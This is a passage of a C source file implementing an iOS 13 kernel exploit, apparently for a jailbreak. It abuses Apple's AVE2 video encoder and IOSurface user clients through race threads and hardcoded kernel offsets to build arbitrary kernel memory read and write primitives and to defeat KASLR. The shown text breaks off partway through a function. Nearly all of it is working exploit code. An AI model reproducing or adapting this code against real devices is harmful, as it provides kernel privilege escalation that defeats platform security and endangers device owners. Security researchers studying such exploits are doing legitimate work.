//
//  ios13_kernel_universal.c
//  ios13_app1
//
//  Created by bb on 1/12/20.
//  Copyright Â© 2020 bb. All rights reserved.
//

// Update* For 13.4/13.4.1 Support
// Update* For 13.6/13.6.1 Support
// Update* For 13.7 Support

#include <stdio.h>
#include <setjmp.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <mach/semaphore.h>
#include <mach/mach_traps.h>
#include <mach/thread_status.h>
#include <pthread/pthread.h>
#include <IOSurface/IOSurfaceRef.h>
#include <copyfile.h>
#include <dirent.h>
#include <mach-o/dyld.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include "IOKitLib.h"
#include "iokit.h"
#include <mach-o/nlist.h>
#include <mach-o/getsect.h>
//#include "Odyssey-Bridging-Header.h"
#include "kernel_memory.h"
#include "KernelUtils.h"

int ppcccp = 1;
void ppp(){
    printf("%d...\n", ppcccp++);
}
//Share analytics
extern bool share_analytics;
extern uint64_t sacrifice_portStru;
extern uint32_t sacrifice_taskport;
extern uint32_t mytipi;
// HARDCODED addresses used in kernel
extern uint64_t HARDCODED_infoleak_addr;
extern uint64_t HARDCODED_allproc;
extern uint64_t HARDCODED_kernel_map;
uint64_t our_taskZec = 0;
// HARDCODED offsets used in kernel
extern uint32_t OFFSET_task_itk_task_access13;
extern uint32_t OFFSET_task_itk_registered;
extern uint32_t OFFSET_task_t_flags13;

// HARDCODED offsets used in kernel
static uint32_t OFFSET_bsd_info_pid13 = 0x68; // +0x68:  bsd_info->pid
static uint32_t OFFSET_bsd_info_task13 = 0x10; // +0x10:  bsd_info->task

static uint32_t OFFSET_task_ref_count = 0x10;
static uint32_t OFFSET_task_active = 0x14;
static uint32_t OFFSET_task_message_app_suspended = 0x1C;
static uint32_t OFFSET_task_vm_map = 0x28; // +0x28: task->vm_map (ios13.x)
static uint32_t OFFSET_task_next = 0x30;
static uint32_t OFFSET_task_prev = 0x38;
static uint32_t OFFSET_task_itk_space = 0x320;
#if __arm64e__
static uint32_t OFFSET_task_bsd_info = 0x388;
#else
static uint32_t OFFSET_task_bsd_info = 0x380;
#endif

static uint32_t OFFSET_ipc_port_io_references = 0x04;
static uint32_t OFFSET_ipc_port_ip_receiver = 0x60;
static uint32_t OFFSET_ipc_port_ip_srights = 0xa0;
static uint32_t OFFSET_ipc_port_ip_kobject = 0x68;

static uint32_t OFFSET_ipc_space_is_table = 0x20;


// HARDCODED zone index used in kernel
extern uint32_t zone_index_ipc_ports;
extern uint32_t zone_index_tasks;

extern void Apply_hardcoded_addresses_and_offsets(void);

jmp_buf reattempt_jmpb;

#define IO_BITS_PORT_INFO   0x0000f000
#define IO_BITS_KOTYPE      0x00000fff
#define IO_BITS_KOBJECT     0x00000800
#define IO_BITS_OTYPE       0x7fff0000
#define IO_BITS_ACTIVE      0x80000000

#define IKOT_NONE               0
#define IKOT_THREAD             1
#define IKOT_TASK               2
#define IKOT_HOST               3
#define IKOT_HOST_PRIV          4
#define IKOT_PROCESSOR          5
#define IKOT_PSET               6
#define IKOT_PSET_NAME          7
#define IKOT_TIMER              8
#define IKOT_PAGING_REQUEST     9
#define IKOT_MIG                10
#define IKOT_MEMORY_OBJECT      11
#define IKOT_XMM_PAGER          12
#define IKOT_XMM_KERNEL         13
#define IKOT_XMM_REPLY          14
#define IKOT_UND_REPLY          15
#define IKOT_HOST_NOTIFY        16
#define IKOT_HOST_SECURITY      17
#define IKOT_LEDGER             18
#define IKOT_MASTER_DEVICE      19
#define IKOT_TASK_NAME          20
#define IKOT_SUBSYSTEM          21
#define IKOT_IO_DONE_QUEUE      22
#define IKOT_SEMAPHORE          23
#define IKOT_LOCK_SET           24
#define IKOT_CLOCK              25
#define IKOT_CLOCK_CTRL         26
#define IKOT_IOKIT_SPARE        27
#define IKOT_NAMED_ENTRY        28
#define IKOT_IOKIT_CONNECT      29
#define IKOT_IOKIT_OBJECT       30
#define IKOT_UPL                31
#define IKOT_MEM_OBJ_CONTROL    32
#define IKOT_AU_SESSIONPORT     33
#define IKOT_FILEPORT           34
#define IKOT_LABELH             35
#define IKOT_TASK_RESUME        36

volatile struct ipc_port {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    // above stru members are pretty stable across versions, below is not, plz pay attenion to change
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
};

volatile struct task
{
    struct {
        uint64_t data;
        uint32_t reserved : 24,
        type     :  8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint32_t pad2;
    uint32_t pad3;
    uint64_t map;
};

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
 
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};

extern void print_hexdump(void *buf, size_t len);
extern void Reply_notify_completion(void);
extern void Send_overwritting_iosurfaceMap(uint64_t remote_map_addr, uint64_t *local_map_addr);
extern void Send_notify_msg(void);
extern bool check_if_its_PAC_device(void);

pthread_attr_t pth_commAttr = {0};
void pth_commAttr_init(){
    pthread_attr_init(&pth_commAttr);
    pthread_attr_setdetachstate(&pth_commAttr, PTHREAD_CREATE_DETACHED);
}

bool check_num_stringlizability_4bytes(uint32_t input_num){
    char *stringlize = (char*)&input_num;
    if(stringlize[0] == '\0')
        return false;
    if(stringlize[1] == '\0')
        return false;
    return true;
}

void IOSurfaceRootUserClient_remove_surface_map(io_connect_t ioconn, uint32_t surfaceId){
    // Release the surface
    uint64_t input_sca = surfaceId;
    IOConnectCallScalarMethod(ioconn, 1, &input_sca, 1, NULL, NULL);
}

uint32_t IOSurfaceRootUserClient_create_surface_map(io_connect_t ioconn, uint64_t *remote_map_addr, uint32_t *remote_map_size){
    
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x4000000, //Need be equal or greater than 0x25BA8 ref: AVE ERROR: IOSurfaceBufferInitInfo->Size() bad
        0x0,
    };
    
    size_t output_stru_size = 0xDD0; // A fixed size
    char *output_stru = calloc(1, output_stru_size);
    int kr = IOConnectCallStructMethod(ioconn, 0, dict_create, sizeof(dict_create), output_stru, &output_stru_size);
    if(!kr){
        uint64_t ret_addr1 = *(uint64_t*)output_stru;
        //uint64_t ret_addr2 = *(uint64_t*)(output_stru + 8); // Read-only mapping from kernel
        //uint64_t ret_addr3 = *(uint64_t*)(output_stru + 0x10); // Read-only mapping from kernel
        // These are unused values here, you can deleted them.
        
        uint32_t ret_addr1_size = *(uint32_t*)(output_stru + 0x1C); // Must be uint32_t length here
        
        *remote_map_addr = ret_addr1;
        *remote_map_size = ret_addr1_size;
        
        return *(uint32_t*)(output_stru+0x18); //Output: Surface ID
    }
    return 0;
}

#pragma mark --- TFP0 Kernel Memory R/W Components ---

uint64_t kaslr = 0;
uint64_t kernel_map_kAddr = 0;
uint64_t ipc_space_kernel_kAddr = 0;
uint32_t tfp0_port13 = 0;
uint64_t tfp0_port13Stru = 0;
jmp_buf reattempt_jmpb;

uint32_t new_reading_primitive(uint64_t target_addr);
uint8_t KernelRead_1byte(uint64_t rAddr){
    if(tfp0_port13){
        uint8_t retdata = 0;
        vm_size_t outsize = 0x1;
        vm_read_overwrite(tfp0_port13, rAddr, 0x1, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    return (uint8_t)new_reading_primitive(rAddr);
}

uint16_t KernelRead_2bytes(uint64_t rAddr){
    if(tfp0_port13){
        uint16_t retdata = 0;
        vm_size_t outsize = 0x2;
        vm_read_overwrite(tfp0_port13, rAddr, 0x2, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    return (uint16_t)new_reading_primitive(rAddr);
}

uint32_t KernelRead_4bytes(uint64_t rAddr){
    if(tfp0_port13){
        uint32_t retdata = 0;
        vm_size_t outsize = 0x4;
        vm_read_overwrite(tfp0_port13, rAddr, 0x4, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    return new_reading_primitive(rAddr);
}

uint64_t KernelRead_8bytes(uint64_t rAddr){
    if(tfp0_port13){
        uint64_t retdata = 0;
        vm_size_t outsize = 0x8;
        vm_read_overwrite(tfp0_port13, rAddr, 0x8, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    uint32_t low_32bit = new_reading_primitive(rAddr);
    uint32_t high_32bit = new_reading_primitive(rAddr + 4);
    return (uint64_t)((((uint64_t)high_32bit) << 32) | low_32bit);
}

void KernelRead_anySize(uint64_t rAddr, char *outbuf, size_t outbuf_len){
    if(tfp0_port13){
        vm_size_t outsize = outbuf_len;
        vm_read_overwrite(tfp0_port13, rAddr, outbuf_len, (vm_address_t)outbuf, &outsize);
        return;
    }
    uint32_t aligned_outbuf_len = (uint32_t)outbuf_len;
    aligned_outbuf_len = (aligned_outbuf_len%4)?(((aligned_outbuf_len/4)+1)*4):aligned_outbuf_len;
    
    for(int i=0; i<aligned_outbuf_len; i=i+4){
        *(uint32_t*)(outbuf + i) = new_reading_primitive(rAddr + i);
    }
}

void new_writing_primi(uint64_t target_addr, uint32_t write_data);
void KernelWrite_1byte(uint64_t wAddr, uint8_t wData){
    if(tfp0_port13){
        vm_write(tfp0_port13, wAddr, (vm_offset_t)&wData, 0x1);
        return;
    }
    uint32_t read_data = KernelRead_4bytes(wAddr);
    *(uint8_t*)(&read_data) = wData;
    new_writing_primi(wAddr, read_data);
}

void KernelWrite_2bytes(uint64_t wAddr, uint16_t wData){
    if(tfp0_port13){
        vm_write(tfp0_port13, wAddr, (vm_offset_t)&wData, 0x2);
        return;
    }
    uint32_t read_data = KernelRead_4bytes(wAddr);
    *(uint16_t*)(&read_data) = wData;
    new_writing_primi(wAddr, read_data);
}

void KernelWrite_4bytes(uint64_t wAddr, uint32_t wData){
    if(tfp0_port13){
        vm_write(tfp0_port13, wAddr, (vm_offset_t)&wData, 0x4);
        return;
    }

    new_writing_primi(wAddr, wData);
}

void KernelWrite_8bytes(uint64_t wAddr, uint64_t wData){
    if(tfp0_port13){
        vm_write(tfp0_port13, wAddr, (vm_offset_t)&wData, 0x8);
        return;
    }

    KernelWrite_4bytes(wAddr, (uint32_t)wData);
    KernelWrite_4bytes(wAddr + 4, (uint32_t)(wData >> 32));
}

void KernelWrite_anySize(uint64_t wAddr, char *inputbuf, uint32_t inputbuf_len){
    if(tfp0_port13){
        vm_write(tfp0_port13, wAddr, (vm_offset_t)inputbuf, inputbuf_len);
        return;
    }
    for(int i=0; i<inputbuf_len; i=i+4){
        new_writing_primi(wAddr + i, *(uint32_t*)(inputbuf + i));
    }
}

uint64_t KernelAllocate(size_t len){
    vm_address_t return_addr = 0;
    vm_allocate(tfp0_port13, (vm_address_t*)&return_addr, len, VM_FLAGS_ANYWHERE);
    return return_addr;
}

void KernelDeallocate(uint64_t addr, size_t len){
    vm_deallocate(tfp0_port13, addr, len);
}

uint32_t KernelUti_GenerateOffset(uint64_t src, uint64_t data_in_src){
    uint32_t returnVal = 0;
    while(1){
        uint64_t gg = KernelRead_8bytes(src);
        if(gg == data_in_src)
            return returnVal;
        returnVal += 4;
        src += 4;
    }
    return 0;
}

#pragma mark --- Kernel Exploitation Start ---

io_connect_t AppleAVE2UserClient_ioconn;
io_connect_t IOSurfaceRootUserClient_ioconn;

char *inputmap_InitInfo = NULL;
uint32_t InitInfo_surfaceId = 0;

uint32_t extra1_surfaceId = 0;
uint32_t extra2_surfaceId = 0;
uint32_t extraMany_surfaceID[20] = {0};

uint64_t input_shit = 0;
uint64_t kObject_AppleAVE2Driver = 0;
uint64_t kObject_IOSurface = 0;

uint64_t our_task_kAddr = 0;
uint64_t our_proc_kAddr = 0;
extern uint64_t our_proc_THORkAddr;

void kernel_exp_start(io_connect_t ave_ioconn, io_connect_t surface_ioconn){
    pth_commAttr_init();
    Apply_hardcoded_addresses_and_offsets();
    
    AppleAVE2UserClient_ioconn = ave_ioconn;
    IOSurfaceRootUserClient_ioconn = surface_ioconn;
    //printf("WE OUT HERE\n");
    extern void ios13_kernel_pwn(io_connect_t ioconn, io_connect_t surface_ioconn);
    ios13_kernel_pwn(ave_ioconn, surface_ioconn);
}

void race_kmem2(){
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1072);
    uint32_t *action1 = (uint32_t*)(inputmap_InitInfo + 4);
    while(*alert1 == 0){}
    *action1 = 0;
}

uint64_t alloc_kernel_40_mem(){
    
    uint64_t user_iosurfaceinfo_buf;
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0; // offset of inputmap_FrameInfo, godamn, cool feature
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
    
    user_iosurfaceinfo_buf = *(uint64_t*)(inputmap_InitInfo + 5936);
    
    return user_iosurfaceinfo_buf;
}

void empty_kernel_40_mem(uint64_t target_addr){
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
   
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
    *(uint64_t*)(inputmap_InitInfo + 5936) = target_addr;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
}

uint64_t alloc_kernel_40_mem_contains_iosurfacebuf(){
    
    uint64_t user_iosurfaceinfo_buf;
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
   
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0;
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 0x333;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 0x1; // this effect 40_mem_destroy, so must set back
    
    user_iosurfaceinfo_buf = *(uint64_t*)(inputmap_InitInfo + 5936);
    
    return user_iosurfaceinfo_buf;
}

void release_kernel_40_mem(uint64_t user_iosurfaceinfo_buf){
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 0;
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
   
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0;
    *(uint64_t*)(inputmap_InitInfo + 5936) = user_iosurfaceinfo_buf;
    
    char *input_stru = calloc(1, 0x28);
    *(uint32_t*)(input_stru + 8) = 0;
    *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
    
    size_t output_stru_size = 0x4;
    char *output_stru = calloc(1, output_stru_size);
    //usleep(1000);
    IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    
    if(*(uint64_t*)(inputmap_InitInfo + 5936)){
        //usleep(50);//
        //(printf)("release_kernel_40_mem failure detected....reattemping\n");
        longjmp(reattempt_jmpb, 1);
    }
}

void IOSurfaceRootUserClient_sRemoveValue(uint32_t spray_id, uint32_t key){
    
    uint32_t input_stru[3] = {0};
    input_stru[0] = spray_id;
    input_stru[1] = 0;
    input_stru[2] = key;
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 11, input_stru, sizeof(input_stru), &output_stru, &output_stru_size);
}

char *www_output_stru = NULL;
char *IOSurfaceRootUserClient_sCopyValue(uint32_t spray_id, uint32_t lookup_key){
    
    uint32_t input_stru[3] = {0};
    input_stru[0] = spray_id;
    input_stru[1] = 0;
    input_stru[2] = lookup_key;
    
    size_t output_stru_size = 5000;
    if(!www_output_stru)
        www_output_stru = malloc(output_stru_size);
    bzero(www_output_stru, output_stru_size);
    
    int kr = IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 10, input_stru, sizeof(input_stru), www_output_stru, &output_stru_size);
    if(kr){
        printf("lookup_key: 0x%x IOSurfaceRootUserClient_sCopyValue failure: 0x%x\n", lookup_key, kr);
        return NULL;
    }
    
    return www_output_stru;
}

uint64_t magic_addr = 0;

uint64_t _temp_kernel_reading_mapOffset = 0x30000;
uint8_t _temp_kernel_reading_semaphore = 0;
uint64_t _temp_kernel_reading_target_addr = 0;

void _temp_kernel_reading_threadFunc(){
    
    uint64_t precalc_value1 = magic_addr + _temp_kernel_reading_mapOffset; // input_shit
    uint64_t precalc_value2 = _temp_kernel_reading_target_addr - 64;
    uint64_t backup_iosurfacebuf = 0;
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset); // input_shit->ptr
    uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + 56);
    
    _temp_kernel_reading_semaphore = 1; // Ready
    printf(".");
    usleep(500);
    while(!*alert1){if(!_temp_kernel_reading_semaphore) return;}
    *(uint64_t*)(inputmap_InitInfo + 5936) = precalc_value1;
    
    while(!*alert2){if(!_temp_kernel_reading_semaphore) return;}
    backup_iosurfacebuf = *alert2;
    *alert2 = precalc_value2;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    while(!*alert3){if(!_temp_kernel_reading_semaphore) return;}
    *alert2 = 0;//backup_iosurfacebuf;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

uint64_t temp_kernel_reading(uint64_t target_addr){
    
    int kr = 0;
    uint64_t retdata = 0;
    do{
        *(uint64_t*)(inputmap_InitInfo + 56) = 0;
        *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
        *(uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset) = 0; // input_shit
        
        _temp_kernel_reading_target_addr = target_addr;
        _temp_kernel_reading_semaphore = 0;
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)_temp_kernel_reading_threadFunc, NULL);
        while(!_temp_kernel_reading_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // To cause AVE ERROR: multiPassEndPassCounterWFR *Can use for early return
        // or cause unmap later in IMG_V_EncodeAndSendFrame
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
        *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
        *(uint64_t*)(inputmap_InitInfo + 5936) = magic_addr + 0x30000 - 0x28; // point to a unused addr
        {
            char input_stru[0x28] = {0};
            *(uint32_t*)(input_stru + 8) = 0;
            *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
            
            size_t output_stru_size = 0x4;
            uint32_t output_stru = 0;
            IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
        }
        _temp_kernel_reading_semaphore = 0;
        pthread_join(ph, NULL);
        
        
        uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 0x10);
        if(*alert3){
            (printf)("alert3: 0x%llx\n", *alert3);
            retdata = *alert3;
            //break;
        }
        
        _temp_kernel_reading_mapOffset = _temp_kernel_reading_mapOffset + 0x8;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        //retdata = *(uint64_t*)(inputmap_InitInfo + 56);
        
    }while(!retdata || kr);
    
    
    return retdata;
}

void _temp_kernel_reading_categ3_threadFunc(){
    
    uint64_t precalc_value1 = magic_addr + _temp_kernel_reading_mapOffset; // input_shit
    uint64_t precalc_value2 = _temp_kernel_reading_target_addr - 64;
    uint64_t backup_iosurfacebuf = 0;
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset); // input_shit->ptr
    uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + 56);
    
    _temp_kernel_reading_semaphore = 1; // Ready
    
    while(!*alert1){if(!_temp_kernel_reading_semaphore) return;}
    *(uint64_t*)(inputmap_InitInfo + 5936) = precalc_value1;
    
    while(!*alert2){if(!_temp_kernel_reading_semaphore) return;}
    backup_iosurfacebuf = *alert2;
    *alert2 = precalc_value2;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    while(!*alert3){if(!_temp_kernel_reading_semaphore) return;}
    *alert2 = 0;//backup_iosurfacebuf;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

uint32_t temp_kernel_reading_categ3(uint64_t target_addr){
    
    int kr = 0;
    uint32_t retdata = 0;
    do{
        ////usleep(50);
        //*(uint32_t*)(inputmap_InitInfo + 4) = 99;
        *(uint64_t*)(inputmap_InitInfo + 56) = 0;
        *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
        *(uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset) = 0; // input_shit
        
        _temp_kernel_reading_target_addr = target_addr;
        _temp_kernel_reading_semaphore = 0;
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)_temp_kernel_reading_categ3_threadFunc, NULL);
        while(!_temp_kernel_reading_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // To cause AVE ERROR: multiPassEndPassCounterWFR *Can use for early return
        // or cause unmap later in IMG_V_EncodeAndSendFrame
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
        *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
        *(uint64_t*)(inputmap_InitInfo + 5936) = magic_addr + 0x30000 - 0x28; // point to a unused addr
        {
            char input_stru[0x28] = {0};
            *(uint32_t*)(input_stru + 8) = 0;
            *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
            
            size_t output_stru_size = 0x4;
            uint32_t output_stru = 0;
            IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
        }
        _temp_kernel_reading_semaphore = 0;
        pthread_join(ph, NULL);
        
        
        uint32_t *alert3 = (uint32_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 16);
        if(*alert3){
            //(printf)("temp_kernel_reading_bypass_kaslr: 0x%x\n", *alert3);
            retdata = *alert3;
            //break;
        }
        
        _temp_kernel_reading_mapOffset = _temp_kernel_reading_mapOffset + 16;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        //retdata = *(uint64_t*)(inputmap_InitInfo + 56);
        
    }while(!retdata || kr);
    
    //complete_frame(0); // mmm
    return retdata;
}

void _temp_kernel_reading_bypass_kaslr_threadFunc(){
    
    uint64_t precalc_value1 = magic_addr + _temp_kernel_reading_mapOffset; // input_shit
    uint64_t precalc_value2 = _temp_kernel_reading_target_addr - 24;
    uint64_t backup_iosurfacebuf = 0;
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset); // input_shit->ptr
    uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + 56);
    
    _temp_kernel_reading_semaphore = 1; // Ready
    
    while(!*alert1){if(!_temp_kernel_reading_semaphore) return;}
    *(uint64_t*)(inputmap_InitInfo + 5936) = precalc_value1;
    
    while(!*alert2){if(!_temp_kernel_reading_semaphore) return;}
    backup_iosurfacebuf = *alert2;
    *alert2 = precalc_value2;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    while(!*alert3){if(!_temp_kernel_reading_semaphore) return;}
    *alert2 = 0;//backup_iosurfacebuf;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

uint32_t temp_kernel_reading_categ5(uint64_t target_addr){
    int ui = 0;
    int kr = 0;
    uint32_t retdata = 0;
    usleep(100);
    do{
        //*(uint32_t*)(inputmap_InitInfo + 4) = 99;
        *(uint64_t*)(inputmap_InitInfo + 56) = 0;
        *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
        *(uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset) = 0; // input_shit
        
        _temp_kernel_reading_target_addr = target_addr;
        _temp_kernel_reading_semaphore = 0;
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)_temp_kernel_reading_bypass_kaslr_threadFunc, NULL);
        while(!_temp_kernel_reading_semaphore){};//{//usleep(800);};//
        ////usleep(800);
        //printf("ð¤");
        *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // To cause AVE ERROR: multiPassEndPassCounterWFR *Can use for early return
        // or cause unmap later in IMG_V_EncodeAndSendFrame
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
        *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
        *(uint64_t*)(inputmap_InitInfo + 5936) = magic_addr + 0x30000 - 0x28; // point to a unused addr
        {
            char input_stru[0x28] = {0};
            *(uint32_t*)(input_stru + 8) = 0;
            *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
            
        //if (ui == 4){
            if (ui < 1000){
                if (ui >= 31) {
                    if ((ui == 60) || (ui == 190) || (ui == 400) || (ui == 600) || (ui == 900) || (ui == 999)){
                        printf("z");
                        usleep(3000);
                    }
                    ui++;
                } else {
                    if (ui == 30){
                        printf("ð¤");// or it'll crash possibly");
                        ui++;
                    } else {
                        ui++;
                        usleep(800);
                    }
                }
                
            }
            ui++;
            
            if ((ui == 3000) || (ui == 4000) || (ui == 5000) || (ui == 6000)){
               // usleep(800);
                printf("ð¤");// or it'll crash possibly");
            }
            size_t output_stru_size = 0x4;
            uint32_t output_stru = 0;
            IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
        }
        _temp_kernel_reading_semaphore = 0;
        pthread_join(ph, NULL);
